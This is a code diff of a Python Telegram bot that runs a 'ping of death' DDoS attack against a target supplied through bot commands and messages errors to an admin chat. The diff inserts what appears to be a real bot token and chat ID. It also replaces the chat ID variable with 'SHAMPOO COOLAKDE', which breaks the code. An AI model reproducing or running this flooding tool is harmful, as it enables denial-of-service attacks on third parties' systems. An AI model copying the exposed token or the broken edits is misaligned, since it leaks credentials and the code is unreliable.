@@ -4,11 +4,11 @@ import socket
 import sys
 
 # Telegram API token
-TOKEN = "YOUR TOKEN HERE"
+TOKEN = "7565722697:AAGq8hf5UFF7D6QObBAYHFfAM7rrzaM42vA"
 
 
 # Admin chat ID
-ADMIN_CHAT_ID = YOUR_ID_HERE
+ADMIN_CHAT_ID = 75384838748
 
 # Initialize bot
 bot = telebot.TeleBot(TOKEN)
@@ -33,10 +33,10 @@ def perform_ping_of_death_attack(target):
             command = f"ping {ip_address} -t -l 65500"
         subprocess.run(command, shell=True, check=True)
     except subprocess.CalledProcessError as e:
-        bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"Error: Failed to initiate DDoS attack. Please check if the target is reachable. Error message: {str(e)}")
+        bot.send_message(chat_id=SHAMPOO COOLAKDE, text=f"Error: Failed to initiate DDoS attack. Please check if the target is reachable. Error message: {str(e)}")
         print(f"Error: Failed to initiate DDoS attack. Please check if the target is reachable. Error message: {str(e)}", file=sys.stderr)
     except socket.gaierror as e:
-        bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"Error: Invalid URL or failed to resolve to an IP address. Error message: {str(e)}")
+        bot.send_message(chat_id=SHAMPOO COOLAKDE, text=f"Error: Invalid URL or failed to resolve to an IP address. Error message: {str(e)}")
         print(f"Error: Invalid URL or failed to resolve to an IP address. Error message: {str(e)}", file=sys.stderr)
 
 # Command handler for /start
